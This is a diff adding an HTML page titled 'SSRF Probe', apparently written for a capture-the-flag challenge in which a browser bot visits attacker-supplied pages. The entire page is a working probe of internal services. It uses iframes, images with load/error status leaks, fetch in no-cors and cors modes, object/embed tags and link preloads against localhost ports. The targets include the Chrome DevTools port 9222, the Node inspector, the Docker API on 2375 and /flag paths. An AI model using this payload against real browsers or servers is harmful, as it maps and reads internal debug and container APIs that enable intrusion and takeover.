@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SSRF Probe - Chrome 130</title>
+    <style>
+        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+        .box { border: 1px solid #0f0; margin: 10px 0; padding: 10px; }
+        iframe, img, object { width: 100%; height: 200px; border: 2px solid red; background: #222; }
+        h2 { color: #ff0; }
+    </style>
+</head>
+<body>
+    <h1>SSRF Internal Probe</h1>
+    <p>Time: <span id="t"></span></p>
+    <script>document.getElementById('t').textContent = new Date().toISOString();</script>
+
+    <!-- ==================== iframes ==================== -->
+    <h2>1. iframes</h2>
+    <div class="box"><b>127.0.0.1:9222/json</b><br>
+        <iframe src="http://127.0.0.1:9222/json"></iframe></div>
+    <div class="box"><b>127.0.0.1:9222/json/version</b><br>
+        <iframe src="http://127.0.0.1:9222/json/version"></iframe></div>
+    <div class="box"><b>127.0.0.1:9229</b><br>
+        <iframe src="http://127.0.0.1:9229"></iframe></div>
+    <div class="box"><b>127.0.0.1:3000</b><br>
+        <iframe src="http://127.0.0.1:3000"></iframe></div>
+    <div class="box"><b>127.0.0.1:8080</b><br>
+        <iframe src="http://127.0.0.1:8080"></iframe></div>
+    <div class="box"><b>127.0.0.1:8000</b><br>
+        <iframe src="http://127.0.0.1:8000"></iframe></div>
+    <div class="box"><b>127.0.0.1:5000</b><br>
+        <iframe src="http://127.0.0.1:5000"></iframe></div>
+    <div class="box"><b>127.0.0.1:4000</b><br>
+        <iframe src="http://127.0.0.1:4000"></iframe></div>
+    <div class="box"><b>127.0.0.1:2375</b> (docker)<br>
+        <iframe src="http://127.0.0.1:2375/version"></iframe></div>
+    <div class="box"><b>127.0.0.1:2376</b><br>
+        <iframe src="http://127.0.0.1:2376/version"></iframe></div>
+    <div class="box"><b>localhost:9222</b><br>
+        <iframe src="http://localhost:9222/json"></iframe></div>
+    <div class="box"><b>0.0.0.0:9222</b><br>
+        <iframe src="http://0.0.0.0:9222/json"></iframe></div>
+
+    <!-- ==================== images ==================== -->
+    <h2>2. Images (status leak via onload/onerror)</h2>
+    <div class="box">
+        <img src="http://127.0.0.1:9222/json" onerror="this.alt='FAIL 9222'" onload="this.alt='OK 9222'">
+        <img src="http://127.0.0.1:3000" onerror="this.alt='FAIL 3000'" onload="this.alt='OK 3000'">
+        <img src="http://127.0.0.1:8080" onerror="this.alt='FAIL 8080'" onload="this.alt='OK 8080'">
+        <img src="http://127.0.0.1:8000/favicon.ico" onerror="this.alt='FAIL 8000'" onload="this.alt='OK 8000'">
+        <img src="http://127.0.0.1:5000" onerror="this.alt='FAIL 5000'" onload="this.alt='OK 5000'">
+        <img src="http://127.0.0.1/" onerror="this.alt='FAIL root'" onload="this.alt='OK root'">
+        <img src="http://127.0.0.1/flag" onerror="this.alt='FAIL /flag'" onload="this.alt='OK /flag'">
+        <img src="http://127.0.0.1/flag.txt" onerror="this.alt='FAIL flag.txt'" onload="this.alt='OK flag.txt'">
+    </div>
+
+    <!-- ==================== fetch + display ==================== -->
+    <h2>3. Fetch results (will appear if CORS allows or same-origin)</h2>
+    <pre id="fetch-out">Loading fetch results...</pre>
+    <script>
+        const targets = [
+            "http://127.0.0.1:9222/json",
+            "http://127.0.0.1:9222/json/version",
+            "http://127.0.0.1:9222/json/list",
+            "http://127.0.0.1:3000",
+            "http://127.0.0.1:8080",
+            "http://127.0.0.1:8000",
+            "http://127.0.0.1:5000",
+            "http://127.0.0.1:4000",
+            "http://127.0.0.1:2375/version",
+            "http://127.0.0.1/",
+            "http://127.0.0.1/flag",
+            "http://127.0.0.1/flag.txt",
+            "http://localhost:9222/json",
+            "http://[::1]:9222/json"
+        ];
+
+        async function probe() {
+            let out = "";
+            for (const url of targets) {
+                try {
+                    const ctrl = new AbortController();
+                    setTimeout(() => ctrl.abort(), 1500);
+                    const r = await fetch(url, {signal: ctrl.signal, mode: "no-cors"});
+                    out += `[no-cors] ${url} → opaque response\n`;
+                } catch(e) {
+                    out += `[error] ${url} → ${e.message}\n`;
+                }
+
+                // thử cors mode để xem có đọc được body không
+                try {
+                    const ctrl = new AbortController();
+                    setTimeout(() => ctrl.abort(), 1500);
+                    const r = await fetch(url, {signal: ctrl.signal, mode: "cors"});
+                    const t = await r.text();
+                    out += `[cors] ${url} → ${r.status}\n${t.slice(0,300)}\n\n`;
+                } catch(e) {
+                    out += `[cors-fail] ${url} → ${e.message}\n`;
+                }
+            }
+            document.getElementById("fetch-out").textContent = out;
+        }
+        probe();
+    </script>
+
+    <!-- ==================== object / embed ==================== -->
+    <h2>4. object / embed</h2>
+    <div class="box">
+        <object data="http://127.0.0.1:9222/json" type="text/html"></object>
+        <embed src="http://127.0.0.1:9222/json" width="100%" height="150">
+    </div>
+
+    <!-- ==================== link preload ==================== -->
+    <link rel="stylesheet" href="http://127.0.0.1:9222/json">
+    <link rel="prefetch" href="http://127.0.0.1:3000">
+    <link rel="preload" href="http://127.0.0.1:8080" as="document">
+
+    <h2>Done probing</h2>
+</body>
+</html>
